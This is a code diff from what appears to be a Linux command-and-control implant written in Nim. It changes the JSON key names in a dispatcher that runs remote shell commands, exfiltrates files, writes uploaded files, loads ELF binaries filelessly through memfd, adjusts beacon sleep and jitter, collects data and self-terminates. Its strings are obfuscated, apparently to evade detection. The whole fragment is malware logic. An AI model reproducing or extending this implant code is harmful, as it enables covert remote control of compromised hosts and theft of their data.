@@ -168,15 +168,15 @@ proc linux_parse_command*(command: JsonNode): bool =
     var command_type = command[protectString("command_type")].getStr()
     case command_type:
         of protectString("cmd"):
-            is_success = run_shell_command(client, command[protectString(protectString("shell_command"))].getStr())
+            is_success = run_shell_command(client, command[protectString(protectString("command"))].getStr())
         of protectString("download"):
-            is_success = exfil_file(client, command[protectString("src_file")].getStr())
+            is_success = exfil_file(client, command[protectString("src")].getStr())
         of protectString("upload"):
-            is_success = write_file(client, command[protectString("src_file_data_base64")].getStr(), command[protectString("dst_file_path")].getStr()) 
+            is_success = write_file(client, command[protectString("src_b64")].getStr(), command[protectString("dst")].getStr()) 
         of protectString("memfd"):
-            is_success = wrap_load_memfd(command[protectString("elf_file_data_base64")].getStr(), command[protectString("command_line")].getStr(), command[protectString("mode")].getStr())
+            is_success = wrap_load_memfd(command[protectString("elf_b64")].getStr(), command[protectString("cmdline")].getStr(), command[protectString("mode")].getStr())
         of protectString("sleep"):
-            is_success = change_sleep_time(client, command[protectString("timeframe")].getInt(), command[protectString("jitter_percent")].getInt())
+            is_success = change_sleep_time(client, command[protectString("sleep")].getInt(), command[protectString("jitter")].getInt())
         of protectString("collect"):
             is_success = collect_data()
         of protectString("die"):
